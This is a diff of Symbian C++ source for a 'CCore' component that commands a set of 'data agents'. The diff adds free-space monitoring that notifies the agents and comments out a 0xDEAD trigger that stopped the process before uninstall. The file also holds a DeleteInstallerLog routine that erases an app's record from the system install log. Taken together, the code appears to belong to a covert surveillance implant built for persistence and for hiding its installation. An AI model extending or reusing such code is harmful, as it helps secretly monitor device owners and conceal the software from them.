@@ -43,6 +43,8 @@ CCore::~CCore()
 	iEndPoints.ResetAndDestroy();
 	iEndPoints.Close();
 	delete iConfig;
+	delete iFreeSpaceMonitor;
+	iFs.Close();
 	__FLOG(_L("EndDestructor"));
 	__FLOG_CLOSE;
 	}
@@ -54,6 +56,9 @@ void CCore::ConstructL()
 	__FLOG(_L("------------"));
 
 	iConfig = CConfigFile::NewL();
+	iFs.Connect();
+	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
+	
 	__FLOG(_L("End ConstructL"));
 	}
 
@@ -80,6 +85,20 @@ void CCore::DisposeAgentsAndActionsL()
 		}	
 	}
 
+
+void CCore::NotifyAllAgentsL(TUint32 aData)
+	{
+	TInt count = iConfig->iAgentsList.Count();
+	for (int i=0; i < count; i++)
+		{
+		CDataAgent* dataAgent = iConfig->iAgentsList[i];
+		if(dataAgent->iStatus != EAgent_Disabled)
+			{
+			TCmdStruct notifyCmd(ENotify, aData, dataAgent->iId);
+			SubmitNewCommandL(notifyCmd);
+			}
+		}
+	}
 
 void CCore::RestartAllAgentsL()
 	{
@@ -385,37 +404,66 @@ void CCore::PropertyChangedL(TUid category, TUint key, TInt value)
 		// this is used to die, before the uninstall
 		// it's triggered calling:
 		// RProperty::Set(KPropertyUidSharedQueue, KPropertyKeySharedQueueTopAddedOrRemoved, 0xDEAD);
+		/*
 		if (value == 0xDEAD)
 		{
 			CActiveScheduler::Stop();
 			return;
 		}
+		*/
 	}
 
 
 void CCore::LogInfoMsgL(const TDesC& aLogMessage)
 	{
-	RFs fs;
-	fs.Connect();
 	CBufBase* buffer = CBufFlat::NewL(50);
 	CleanupStack::PushL(buffer);
 	buffer->InsertL(buffer->Size(),(TUint8*)aLogMessage.Ptr(),aLogMessage.Size());
 	HBufC8* byteBuf = buffer->Ptr(0).AllocLC();
-	CLogFile* logFile = CLogFile::NewLC(fs);
+	CLogFile* logFile = CLogFile::NewLC(iFs);
 	logFile->CreateLogL(LOGTYPE_INFO);
 	logFile->AppendLogL(*byteBuf);
 	logFile->CloseLogL();
 	CleanupStack::PopAndDestroy(logFile);
 	CleanupStack::PopAndDestroy(byteBuf);
 	CleanupStack::PopAndDestroy(buffer);
-	fs.Close();
+	}
+
+
+void CCore::StartMonitorFreeSpace()
+	{
+	TBool below = iFreeSpaceMonitor->IsBelowThreshold();
+	if(below)
+		{
+		TUint32 data = 0;
+		data |= ENotifyThreshold;
+		data |= EBelow;
+		NotifyAllAgentsL(data);
+		}
+	iFreeSpaceMonitor->StartListeningForEvents();
+	}
+
+void CCore::NotifyAboveThreshold()
+	{
+	TUint32 data = 0;
+	data |= ENotifyThreshold;
+	data |= EAbove;
+	NotifyAllAgentsL(data);
+	}
+
+void CCore::NotifyBelowThreshold()
+	{
+	TUint32 data = 0;
+	data |= ENotifyThreshold;
+	data |= EBelow;  
+	NotifyAllAgentsL(data);
 	}
 
 LOCAL_C void DeleteInstallerLog(TUid aUid)
 	{
 	// install log table has been defined into Symbian source code as:
 	/*
-	// SQL query to create the log table
+	// SQL query used to create the log table
 	_LIT( KLogCreateTableSQL, 
 	"CREATE TABLE log (time BIGINT NOT NULL,uid UNSIGNED INTEGER NOT NULL,\
 	name VARCHAR(128) NOT NULL,vendor VARCHAR(128) NOT NULL,\
@@ -500,10 +548,11 @@ LOCAL_C void DoStartL()
 	//load config
 	core->LoadConfigAndStartL();
 	
-		
+	//start free space monitor
+	core->StartMonitorFreeSpace();
+	
 	CActiveScheduler::Start(); 
 	CleanupStack::PopAndDestroy(core);
-
 	// Delete active scheduler
 	CleanupStack::PopAndDestroy(scheduler);
 	}
